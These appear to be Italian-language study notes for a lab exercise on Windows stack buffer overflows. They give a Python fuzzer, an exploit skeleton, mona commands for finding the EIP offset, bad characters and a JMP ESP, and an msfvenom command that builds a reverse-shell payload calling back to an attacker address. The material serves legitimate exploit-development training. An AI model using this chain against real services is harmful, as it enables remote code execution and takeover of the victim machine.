## **SETUP**

Configurazione di mona
```mona
!mona config -set workingfolder c:\mona\%p
```
### **script per fare fuzzing e trovare il punto di segmentation fault**
```PYTHON
#!/usr/bin/env python3
import socket, time, sys
ip = "<IP>"
port = <PORT>
timeout = 5
string = "A" * 100
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string)))
        sys.exit(0)
    string += "A" * 100
    time.sleep(1)
```
![[Pasted image 20230512095414.png]]
### **Controllo dell'eip**
```python
import socket
ip = "10.10.206.203"
port = 1337
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""
buffer = overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```
Runna il seguente comando con con una maggiorazione di 400 bytes in più rispetto alla strunga che ha fatto crashare prima
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <N>
```
Copialo nella variabile payload dello script ed eseguilo. Dovrebbe crashare il programma

Usa il seguente comando per vedere i log. Se non si vedono Window > Log Data > CPU
```mona
!mona findmsp -distance 600
```
Trova la seguente riga
```
EIP contains normal pattern : ... (offset XXXX)
```
![[Pasted image 20230512095626.png]]
Scrivi l'offset allìinterno della variabile offet dello script e metti payload vuoto. Imposta retn su BBBB e sovrascriverai l'EIP
![[Pasted image 20230512095641.png]]
## **Trovare bad characters**
Genera un bytearray con mona
```mona
!mona bytearray -b "\x00"
```
genera una stringa uguale con il seguente script
```python
for x in range(1, 256):
	print("\\x" + "{:02x}".format(x), end='')
print()
```
Inserisci la stringa nella variabile payload e avvia lo script( ricorda di avviare il programma su immunity). Vedi dove punta l'esp ed usa il seguente comando
```mona
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```
Prendi nota dei bad characters trovati e genera un altro bytearray senza di questi.
Ripeti finchè il bitearray non sarà immodificato.
![[Pasted image 20230512095825.png]]
## **JUMP POINT**
Con il programma crashato runna il seguente comando includendo tutti i bad characters
```mona
!mona jmp -r esp -cpb "\x00"
```
Il comando mostra i jump esp in log data. Scegli un indirizzo e scrivilo all'interno della variabile retn.

ex: 635011af diventa /xaf/x11/x50/x63

## **GENERA IL PAYLOAD**
Runna il comando per generare il payload, includi tutti i bad characters
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.69.95 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
E incollalo nello script
crea spazio al payload aggiungendo al padding
```bash
padding = "\x90" * 32
```